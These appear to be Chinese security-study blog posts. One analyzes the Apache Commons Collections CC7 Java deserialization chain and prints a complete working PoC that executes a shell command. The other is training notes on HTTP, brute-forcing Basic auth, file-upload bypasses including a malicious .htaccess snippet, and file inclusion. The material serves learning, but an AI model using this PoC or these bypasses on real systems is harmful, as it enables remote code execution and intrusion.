<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Hashtable.readObject()-&gt;reconstitutionPut()</span><br><span class="line">LazyMap.equals()==AbstractMapDecorator.equals()</span><br><span class="line">AbstractMap.equals()</span><br><span class="line">LazyMap.get()</span><br></pre></td></tr></table></div></figure>


        <h2 id="限制-6"   >
          <a href="#限制-6" class="heading-link"><i class="fas fa-link"></i></a><a href="#限制-6" class="headerlink" title="限制"></a>限制</h2>
      <p><code>JDK</code>版本：暂无限制</p>

        <h2 id="Poc-1"   >
          <a href="#Poc-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#Poc-1" class="headerlink" title="Poc"></a>Poc</h2>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC7</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[]&#123;&#125;);</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;touch bbbb&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Map innerMap1 = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map innerMap2 = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">        Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);</span><br><span class="line">        Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);</span><br><span class="line"></span><br><span class="line">        lazyMap1.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        lazyMap2.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Hashtable hashtable = <span class="keyword">new</span> Hashtable();</span><br><span class="line">        hashtable.put(lazyMap1, <span class="number">1</span>);</span><br><span class="line">        hashtable.put(lazyMap2, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        setField(transformerChain,<span class="string">&quot;iTransformers&quot;</span>,transformers);</span><br><span class="line"></span><br><span class="line">        lazyMap2.remove(<span class="string">&quot;zZ&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;./cc7&quot;</span>));</span><br><span class="line">            outputStream.writeObject(hashtable);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;./cc7&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setField</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="解析-8"   >
          <a href="#解析-8" class="heading-link"><i class="fas fa-link"></i></a><a href="#解析-8" class="headerlink" title="解析"></a>解析</h2>
      
        <h3 id="Hashtable-readObject"   >
          <a href="#Hashtable-readObject" class="heading-link"><i class="fas fa-link"></i></a><a href="#Hashtable-readObject" class="headerlink" title="Hashtable.readObject()"></a><code>Hashtable.readObject()</code></h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807102603926.png" alt="image-20220807102603926"></p>

        <h3 id="Hashtable-reconstitutionPut"   >
          <a href="#Hashtable-reconstitutionPut" class="heading-link"><i class="fas fa-link"></i></a><a href="#Hashtable-reconstitutionPut" class="headerlink" title="Hashtable.reconstitutionPut()"></a><code>Hashtable.reconstitutionPut()</code></h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807102732158.png" alt="image-20220807102732158"></p>
<p>由于<code>LazyMap</code>继承了<code>AbstractMapDecorator</code>，所以会调用到其<code>equals</code>函数</p>

        <h3 id="LazyMap-equals-AbstractMapDecorator-equals"   >
          <a href="#LazyMap-equals-AbstractMapDecorator-equals" class="heading-link"><i class="fas fa-link"></i></a><a href="#LazyMap-equals-AbstractMapDecorator-equals" class="headerlink" title="LazyMap.equals()==AbstractMapDecorator.equals()"></a><code>LazyMap.equals()==AbstractMapDecorator.equals()</code></h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807102940029.png" alt="image-20220807102940029"></p>
<p>这里的<code>equals</code>接着往下跳转就不知道为什么会直接跳到<code>AbstractMap.equals()</code>了</p>

        <h3 id="AbstractMap-equals"   >
          <a href="#AbstractMap-equals" class="heading-link"><i class="fas fa-link"></i></a><a href="#AbstractMap-equals" class="headerlink" title="AbstractMap.equals()"></a><code>AbstractMap.equals()</code></h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807103216037.png" alt="image-20220807103216037"></p>

        <h3 id="LazyMap-get-3"   >
          <a href="#LazyMap-get-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#LazyMap-get-3" class="headerlink" title="LazyMap.get()"></a><code>LazyMap.get()</code></h3>
      <p>接着就是经典链子<code>CCI</code>了。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807103304810.png" alt="image-20220807103304810"></p>

        <h2 id="🔺注-2"   >
          <a href="#🔺注-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺注-2" class="headerlink" title="🔺注"></a>🔺注</h2>
      
        <h3 id="1-hashtable-put两次"   >
          <a href="#1-hashtable-put两次" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-hashtable-put两次" class="headerlink" title="1.hashtable.put两次"></a>1.<code>hashtable.put</code>两次</h3>
      <p>由于需要在<code>Hashtable.reconstitutionPut()</code>中进入该循环，所以需要<code>hashtable.put</code>两次，</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807104841649.png" alt="image-20220807104841649"></p>

        <h3 id="2-反射设置CCI链子"   >
          <a href="#2-反射设置CCI链子" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-反射设置CCI链子" class="headerlink" title="2.反射设置CCI链子"></a>2.反射设置<code>CCI</code>链子</h3>
      <p>如果直接进行设置，那么在本地<code>hashtable.put</code>的时候也会触发<code>RCE</code>，那么在<code>hashtable.put</code>之后再设置<code>CCI</code>链，就不会本地触发<code>RCE</code>了，这样是为了防止非预期的一些东西，就像在之前<code>CC5</code>中预防本地<code>RCE</code>一样。</p>
<p><img src="../../../../AppData/Roaming/Typora/typora-user-images/image-20220807105255253.png" alt="image-20220807105255253"></p>

        <h3 id="3-hash碰撞"   >
          <a href="#3-hash碰撞" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-hash碰撞" class="headerlink" title="3.hash碰撞"></a>3.hash碰撞</h3>
      <p>为什么<code>put</code>的时候需要<code>yy</code>和<code>zZ</code>，这样是为了使得其生成的<code>hash</code>相同，从而能够进行比较，在<code>Hashtable.reconstitutionPut()</code>中能够通过前面的<code>hash</code>相等条件</p>
<p><img src="../../../../AppData/Roaming/Typora/typora-user-images/image-20220807114011896.png" alt="image-20220807114011896"></p>
<p>当然换成其他的能够进行<code>hash</code>碰撞的也是一样的。</p>

        <h3 id="4-remove必要性"   >
          <a href="#4-remove必要性" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-remove必要性" class="headerlink" title="4.remove必要性"></a>4.remove必要性</h3>
      <p>至于为什么需要<code>lazyMap2.remove(&quot;zZ&quot;);</code>简单来说，就是第一次<code>hashtable.put</code>的时候，由于<code>hashtable.table</code>为<code>null</code>，无法进入循环到如下的<code>equals</code>函数触发<code>LazyMap.get()</code>。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807112631117.png" alt="image-20220807112631117"></p>
<p>但是第二次的时候就会进入比较函数</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807112907832.png" alt="image-20220807112907832"></p>
<p>从而进入到<code>LazyMap.get()</code>调用空的<code>transform</code>函数数组，返回一个<code>key</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807113208463.png" alt="image-20220807113208463"></p>
<p>导致我们的<code>LazyMap2</code>会多一个<code>key</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807113425973.png" alt="image-20220807113425973"></p>
<p>如果保留下来，就无法进入到在<code>AbstractMap.equals</code>对应触发漏洞的地方，在如下地方就直接没掉，那么就需要去掉<code>lazyMap2</code>下由于空的<code>Transform</code>数组调用多出来的一个<code>key</code>了，都是为了进行各种绕过。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807113545609.png" alt="image-20220807113545609"></p>

        <h1 id="总结"   >
          <a href="#总结" class="heading-link"><i class="fas fa-link"></i></a><a href="#总结" class="headerlink" title="总结"></a>总结</h1>
      <p>感觉差不多了，没什么太多的地方需要慢慢学习了。</p>
<p>本菜鸡觉得<code>CC</code>链的学习主要就是分两部分吧</p>
<p>一部分是后面的用来调用命令的部分，我觉得叫<strong>命令链</strong>比较合适，比如这里写到的经典链子<code>CCI</code>，经典链子<code>ITN</code>之类的，这部分都大同小异，暂时就那一些。</p>
<p>另一部分就是从<code>readObject</code>调用到<strong>命令链</strong>的部分，这部分通常是需要需要慢慢挖掘的，主要的点就是找能调用到<code>transform</code>地方。</p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/06/19/%E5%AE%9E%E8%AE%AD/">大三末实训</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-06-19</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2023-09-11</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h2 id="前言"   >
          <a href="#前言" class="heading-link"><i class="fas fa-link"></i></a><a href="#前言" class="headerlink" title="前言"></a>前言</h2>
      <p>实训的笔记，记录一下，防止忘记</p>

        <h2 id="网站URL"   >
          <a href="#网站URL" class="heading-link"><i class="fas fa-link"></i></a><a href="#网站URL" class="headerlink" title="网站URL"></a>网站URL</h2>
      <p>统一资源定位器(<code>uniform resource locator</code>)，用来定位服务器的资源</p>
<p>标准格式：<code>protocol://hostname[:port]/path/[?query]</code></p>
<p><code>http</code>默认80端口</p>
<ul>
<li><p><code>%[ascii]</code>：此外<code>+</code>也代表空格，常用来转换<code>&amp;</code>字符或者其他的一些特殊字符</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530112713188.png" alt="image-20220530112713188"></p>
</li>
<li><p><code>base64</code>编码：<code>http</code>环境下传递较长的标识信息</p>
</li>
<li><p><code>Hex</code>编码：</p>
</li>
</ul>

        <h2 id="协议HTTP"   >
          <a href="#协议HTTP" class="heading-link"><i class="fas fa-link"></i></a><a href="#协议HTTP" class="headerlink" title="协议HTTP"></a>协议HTTP</h2>
      <p>无状态的协议，通过<code>cookie</code>和<code>session</code>来进行相关的状态处理</p>

        <h3 id="1-请求报文"   >
          <a href="#1-请求报文" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-请求报文" class="headerlink" title="(1)请求报文"></a>(1)请求报文</h3>
      
        <h4 id="①结构"   >
          <a href="#①结构" class="heading-link"><i class="fas fa-link"></i></a><a href="#①结构" class="headerlink" title="①结构"></a>①结构</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530141434979.png" alt="image-20220530141434979"></p>
<ul>
<li><code>User-Agent</code>：产生请求的浏览器类型，一般可以随意指定，但是当服务器方面有限制则会受到影响，比如爬虫进行检查</li>
<li><code>Accept</code>：用户声明客户端可以处理的<code>MIME</code>类型，即文件类型</li>
<li><code>Accept-Encoding</code>：用于声明客户端能够理解的内容编码方式</li>
<li><code>Accept-Language</code>：用于声明客户端可以理解的自然语言</li>
<li><code>Cookie</code>：存放用户的身份凭证</li>
<li><code>Content-Length</code>：请求数据的长度，服务器端只会按照该字段进行长度解析，多余的截断。</li>
<li><code>Referer</code>：当前访问URL的上一个URL，用户从什么地方来到该页面的</li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530142815202.png" alt="image-20220530142815202"></p>

        <h4 id="②请求方法"   >
          <a href="#②请求方法" class="heading-link"><i class="fas fa-link"></i></a><a href="#②请求方法" class="headerlink" title="②请求方法"></a>②请求方法</h4>
      <p><code>GET/POST/CONNECT</code>等等</p>
<p><code>GET</code>：没有请求数据的部分，在URL中传输数据，由于URL长度限制，所以传输的数据也是有限制的。</p>
<p><code>POST</code>：在请求数据部分进行数据传输，长度基本没有什么限制，注意设置<code>Content-Type</code>和<code>Content-Length</code></p>

        <h3 id="2-响应报文"   >
          <a href="#2-响应报文" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-响应报文" class="headerlink" title="(2)响应报文"></a>(2)响应报文</h3>
      <p>描述服务器端的一些信息</p>

        <h4 id="①结构-1"   >
          <a href="#①结构-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#①结构-1" class="headerlink" title="①结构"></a>①结构</h4>
      <ul>
<li><p><code>Data</code>：请求发送的时间和日期，GMT时间</p>
</li>
<li><p><code>Server</code>：告诉客户端服务器的名称和版本号</p>
</li>
<li><p><code>Content-Type</code>：响应正文的<code>MIME</code>类型</p>
</li>
<li><p><code>Content-Length</code>：响应正文的长度</p>
</li>
<li><p><code>Connection</code>：告诉客户端完成相应后的连接状态</p>
</li>
<li><p><code>Content-Encoding</code>：Web服务器告诉浏览器数据传输使用了那种压缩方法</p>
</li>
<li><p><code>Last-Modified</code>：实体报头域用于指示资源最后的修改日期和时间</p>
</li>
<li><p>状态码：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530143957584.png" alt="image-20220530143957584"></p>
<ul>
<li>200：请求成功</li>
<li>1XX：服务器收到请求，需要请求者继续执行操作</li>
<li>2XX：成功</li>
<li>3XX：重定向，需要进一步的操作用以完成请求。类似需要登录</li>
<li>4XX：客户端错误，请求包含语法错误或者无法完成请求</li>
<li>5XX：服务器端错误，服务器在处理请求的过程中发生了错误</li>
</ul>
</li>
</ul>
<p>等等，还有一些其他的</p>

        <h2 id="协议HTTPS"   >
          <a href="#协议HTTPS" class="heading-link"><i class="fas fa-link"></i></a><a href="#协议HTTPS" class="headerlink" title="协议HTTPS"></a>协议HTTPS</h2>
      <p>在<code>HTTP</code>下加入了<code>SSL/TLS</code>层，通过安全机制进行传输数据。握手过程是明文传输，来建立<code>HTTPS</code>连接</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530144221805.png" alt="image-20220530144221805"></p>

        <h2 id="会话"   >
          <a href="#会话" class="heading-link"><i class="fas fa-link"></i></a><a href="#会话" class="headerlink" title="会话"></a>会话</h2>
      <p>利用<code>cookie</code>(客户端)和<code>session</code>(服务端)来进行保存会话状态，比如记住密码</p>
<p>客户端第一次发送数据给服务端时没有<code>Cookie</code>，服务器收到请求后，创建<code>Session</code>，之后通过<code>Set-Cookie</code>字段把<code>Session ID</code>以<code>Cookie</code>的形式告诉客户端。以后每次请求发送该<code>Cookie</code>到服务器，服务器即可识别。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530145435543.png" alt="image-20220530145435543"></p>

        <h2 id="关于Webshell"   >
          <a href="#关于Webshell" class="heading-link"><i class="fas fa-link"></i></a><a href="#关于Webshell" class="headerlink" title="关于Webshell"></a>关于Webshell</h2>
      <p>一个服务器权限</p>

        <h2 id="身份认证"   >
          <a href="#身份认证" class="heading-link"><i class="fas fa-link"></i></a><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h2>
      <p>通常爆破</p>

        <h3 id="1-常见认证"   >
          <a href="#1-常见认证" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-常见认证" class="headerlink" title="(1)常见认证"></a>(1)常见认证</h3>
      <p><code>Burpsuite</code>中的<code>Intruder</code>模块有很多选项</p>
<p>可以设置需要爆破的地方，爆破方式，编码方式，爆破字典，是否跳转(状态码为302)等等</p>

        <h3 id="2-Basic认证"   >
          <a href="#2-Basic认证" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-Basic认证" class="headerlink" title="(2)Basic认证"></a>(2)Basic认证</h3>
      <p>常见<code>admin:passwd</code>等，关键词为：<code>Authorization：Basic [xxxx]</code>，其中<code>xxxx</code>即为<code>admin:passwd</code>的相关编码，这个可以在<code>Intruder-&gt;Payloads-&gt;Payload type</code>选择<code>Custom iterator</code>。之后在<code>Payload Options [Simple list]</code>中设置下不同的字典即可，即自定义一个字段的不同位置数据的迭代爆破。</p>
<ul>
<li>设置方式</li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530192510353.png" alt="image-20220530192510353"></p>
<ul>
<li><p>设置字典</p>
<ul>
<li><p>用户密码<img src="C:/Users/007/AppData/Roaming/Typora/typora-user-images/image-20220530192504191.png" alt="image-20220530192504191"></p>
</li>
<li><p>中间冒号</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530192534539.png" alt="image-20220530192534539"></p>
</li>
<li><p>字典</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530192702136.png" alt="image-20220530192702136"></p>
</li>
</ul>
</li>
<li><p>设置编码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530192746452.png" alt="image-20220530192746452"></p>
</li>
<li><p>取消特殊字符，这里即为<code>=</code>的<code>url</code>编码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530192817488.png" alt="image-20220530192817488"></p>
</li>
</ul>

        <h2 id="文件上传"   >
          <a href="#文件上传" class="heading-link"><i class="fas fa-link"></i></a><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2>
      
        <h3 id="1-验证漏洞"   >
          <a href="#1-验证漏洞" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-验证漏洞" class="headerlink" title="(1)验证漏洞"></a>(1)验证漏洞</h3>
      <ul>
<li><p>客户端<code>JavaScript</code>验证</p>
<p>当发现不是从服务器返回的验证不通过信息，就可能是客户端本身的<code>JavaScript</code>进行了验证，那么就可以在<code>Burpsuite</code>发包的过程对文件进行修改，比如改掉文件名称等。</p>
<p>或者直接修改本地网页中的<code>JavaScript</code>代码，或者使用插件禁用掉<code>JavaScript</code>代码脚本</p>
</li>
<li><p>服务端验证</p>
<ul>
<li><p><code>MIME</code>限制：常见的服务器对<code>Content-Type</code>进行解析限制</p>
</li>
<li><p>文件内容验证：通常验证文件头，可以修改其文件头，或者将一句话木马放入到对应的文件内容最后</p>
<p><code>JPG</code>：FF D8 FF E0 00 10 4A 46 49 46</p>
<p><code>GIF</code>：47 49 46 38 39 61<code>(GIF89a)</code></p>
<p><code>PNG</code>：89 50 4E 47</p>
</li>
<li><p>文件扩展名验证：验证文件的后缀，黑名单白名单之类的</p>
<ul>
<li><p>大小写绕过(<code>Windows</code>下大小写不敏感)</p>
</li>
<li><p><code>windows</code>下的文件名后缀不规范（或者某些特殊字符）会被改掉，比如<code>test.php....</code>会被修改为<code>test.php</code>，但是这样就可以绕过验证了，实际还是执行的<code>php</code>文件。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530212508036.png" alt="image-20220530212508036"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530212656016.png" alt="image-20220530212656016"></p>
</li>
<li><p>如果只是替换后缀名，那么可以进行拓展后缀名绕过，比如<code>phphpp</code></p>
</li>
<li><p><code>%00</code>截断绕过：保存文件时可能会将文件名和目录进行拼接，那么就可以绕过<code>（PHP&lt;5.3.34）</code></p>
</li>
<li><p>特殊可解析后缀绕过：</p>
<p>在某些环境（比如基于<code>ubuntu</code>的<code>apt-get</code>按照的<code>apache</code>）中，会将某些特殊的文件名后缀当作某一类文件进行解析，比如<code>php3</code>会被当作<code>php</code>解析</p>
<p>可能是开发的时候历史遗留问题把</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530205111015.png" alt="image-20220530205111015"></p>
</li>
</ul>
</li>
<li><p><code>Apache</code>的<code>.htaccess</code>绕过</p>
<p><code>Apache</code>里面有一个配置文件，<code>xx.htacess</code>可以用来写入<code>Apache</code>配置信息，用来改变当前目录以及子目录下的<code>Apache</code>的配置信息。</p>
<p>需要如下条件：</p>
<ul>
<li><p>运行<code>.htaccess</code>生效</p>
</li>
<li><p><code>Apache</code>开启<code>rewrite</code>模块</p>
</li>
<li><p><code>Apache</code>配置文件为<code>AllowOverride All</code>（默认为<code>None</code>）</p>
</li>
</ul>
<p>那么就可以尝试上传该文件</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;sec.jpg&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></div></figure>

<p>之后当前配置下生效的地方，<code>sec.jpg</code>即可被解析为<code>php</code></p>
</li>
</ul>
</li>
</ul>

        <h3 id="2-服务器解析漏洞"   >
          <a href="#2-服务器解析漏洞" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-服务器解析漏洞" class="headerlink" title="(2)服务器解析漏洞"></a>(2)服务器解析漏洞</h3>
      <ul>
<li><p><code>Apache</code>解析漏洞</p>
<p>从右往左解析，<code>abc.php.ccc.aaa</code>会被当作<code>abc.php</code>来进行解析（某些版本）</p>
</li>
<li><p><code>IIS6.0</code>解析漏洞（<code>windows</code>的中间件）</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530213952989.png" alt="image-20220530213952989"></p>
</li>
<li><p><code>Nginx</code>解析漏洞</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530214053524.png" alt="image-20220530214053524"></p>
</li>
</ul>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/c0ny1/upload-labs" >c0ny1/upload-labs: 一个想帮你总结所有类型的上传漏洞的靶场 (github.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="文件下载"   >
          <a href="#文件下载" class="heading-link"><i class="fas fa-link"></i></a><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h2>
      
        <h3 id="1-利用"   >
          <a href="#1-利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-利用" class="headerlink" title="(1)利用"></a>(1)利用</h3>
      <p>过滤规则不好，可以下载任意文件</p>
<ul>
<li>获取站点源码</li>
<li>获取站点与中间件配置文件</li>
<li>获取应用与系统的配置文件</li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220601104430476.png" alt="image-20220601104430476"></p>
<p>可利用的相关配置文件</p>
<ul>
<li><p>Windows平台</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220601105607099.png" alt="image-20220601105607099"></p>
</li>
<li><p>Linux平台</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220601105623772.png" alt="image-20220601105623772"></p>
</li>
</ul>

        <h3 id="2-防御"   >
          <a href="#2-防御" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-防御" class="headerlink" title="(2)防御"></a>(2)防御</h3>
      <ul>
<li>文件保存到数据库，依据ID进行下载</li>
<li>参数过滤，不能目录穿越</li>
</ul>

        <h2 id="文件包含"   >
          <a href="#文件包含" class="heading-link"><i class="fas fa-link"></i></a><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2>
      <p>即<code>include</code>和<code>require</code>相关函数，将用户指定的文件包含进来。那么如果该文件中有<code>php</code>代码，则会被执行，其他的字符，则会被输出。不受到相关文件后缀，文件头之类的限制。</p>

        <h3 id="1-函数解析"   >
          <a href="#1-函数解析" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-函数解析" class="headerlink" title="(1)函数解析"></a>(1)函数解析</h3>
      <ul>
<li><code>include</code>：包含过程中如果出现错误，只会生成警告（<code>E_WARNING</code>），在<code>include</code>函数后面的代码还是会正常被执行</li>
<li><code>require</code>：包含过程中如果出现错误，会生成致命错误（<code>E_COMPILE_ERROR</code>）并且停止脚本运行，之后的代码都不包会被运行。</li>
<li><code>include_once</code>和<code>require_once</code>两个函数，如果文件已经包含，则不会再次被包含，防止相关函数重定义或者变量重新赋值。</li>
</ul>

        <h3 id="2-漏洞利用"   >
          <a href="#2-漏洞利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-漏洞利用" class="headerlink" title="(2)漏洞利用"></a>(2)漏洞利用</h3>
      <p>通过<code>PHP</code>函数引入文件时，如果对文件名没有限制或者合理的验证，很容易执行到相关的漏洞<code>php</code>代码或者文件信息泄露。</p>
